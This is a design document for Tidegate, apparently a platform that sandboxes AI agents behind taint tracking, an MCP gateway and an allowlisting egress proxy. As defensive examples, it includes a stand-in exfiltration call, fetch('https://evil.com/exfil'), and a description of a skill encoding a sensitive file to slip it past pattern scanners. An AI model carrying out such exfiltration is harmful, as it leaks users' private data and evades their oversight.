# Defenses — Three Enforcement Layers

Tidegate is a secure deployment platform. The user installs Tidegate instead of installing an agent framework directly. Tidegate includes the agent (OpenClaw, etc.) pre-configured inside a container topology with three enforcement layers.

## Layer 1: Journal-based taint tracking + skill hardening (hard boundary)

Layer 1 tracks which processes access sensitive files at runtime and blocks tainted processes from establishing network connections. **No security code runs inside the agent container** — observation is via eBPF (in-kernel), and all decision-making happens in the `tg-scanner` container.

**How it works**: Three components cooperate:

1. **eBPF on `openat`**: A lightweight eBPF program observes every file open in the agent container. Logs `{pid, file_path, sequence_number}` to a ring buffer. Non-blocking, nanosecond overhead. Pure observation.
2. **Scanner daemon** (in tg-scanner): Reads file-open events from the ring buffer. Reads file contents from a shared read-only workspace volume. Runs the scanner (`{value} → {allow/deny}`). Updates a taint table: if a file contains sensitive data, the PID that opened it is tainted.
3. **seccomp-notify on `connect()`**: A custom OCI runtime wrapper (`tidegate-runtime`) injects a seccomp-notify filter for `connect()` into the agent container. When a process tries to establish a TCP connection, the kernel pauses the thread and notifies tg-scanner. tg-scanner waits for the scanner daemon to catch up with pending file-open events for that PID, then checks the taint table. Tainted PID → deny (`EPERM`). Clean PID → allow.

This is **load-bearing, not a bonus layer.** Without it, a skill can read your bank statement, base64-encode it, and exfiltrate the encoded data to an allowed domain. Layers 2 and 3 scan outbound values for patterns — but patterns are destroyed by encoding. Layer 1 doesn't care about the encoding — it tracks that the process *read a sensitive file*, and blocks its network access:

1. Read sensitive data (can't block — user mounted the files, but eBPF *observes* the read)
2. Encode/encrypt it (doesn't matter — PID is already tainted)
3. **Attempt network connection (Layer 1 blocks here)**

This is a **hard boundary** — eBPF observation is in-kernel (can't be evaded from userspace), and the seccomp-notify filter on `connect()` is installed by the kernel at container creation (can't be removed from userspace). The key insight: `connect()` via seccomp-notify **pauses the calling thread**, providing a natural synchronization barrier — the scanner daemon can process file-open events asynchronously, and enforcement still happens before any data leaves.

**Skill hardening**: When a user installs a skill, Tidegate rewrites the SKILL.md — stripping `` !`command` `` preprocessing (which executes shell commands at load time before any hooks fire), constraining `allowed-tools` in the frontmatter, and wrapping bundled scripts. This operates on the cross-platform SKILL.md file format and works regardless of agent framework.

**Agent-specific hooks**: On Claude Code, Tidegate also installs PreToolUse hooks that scan tool arguments before execution. Other agent frameworks get taint tracking (universal) but not framework-specific hooks.

## Layer 2: Tidegate MCP gateway (hard boundary)

All MCP tool calls from the agent pass through the Tidegate gateway over the network. The gateway mirrors downstream MCP servers' tool lists and scans all outbound parameter values. This is a **hard boundary** — the agent container cannot reach MCP servers directly (separate Docker network).

The gateway:
- Mirrors tool definitions from downstream MCP servers (no per-field YAML mappings needed)
- Scans all outbound parameter values for credentials, financial instruments, government IDs
- Optionally restricts which tools are visible (tool allowlist)
- Returns shaped denies (`isError: false`) so the agent adjusts instead of retrying
- Scans responses before returning them to the agent
- Logs every tool call for audit

## Layer 3: agent-proxy (hard boundary)

Skills need HTTP access for their APIs — you can't block all internet from the agent container. The agent-proxy replaces a simple CONNECT-only egress proxy with selective behavior:

- **LLM API domains**: CONNECT passthrough (end-to-end TLS, no inspection)
- **Skill-allowed domains**: MITM + scan + credential injection (skills never hold API keys)
- **Everything else**: blocked

This is a **hard boundary** — the agent container's only path to the internet is through the proxy. A skill that tries `fetch("https://evil.com/exfil")` gets blocked because `evil.com` isn't on any allowlist.

Credential injection through the proxy means skills never see API keys. The proxy adds authentication headers to outbound requests, so credentials exist only in the proxy's configuration, not in the agent container.
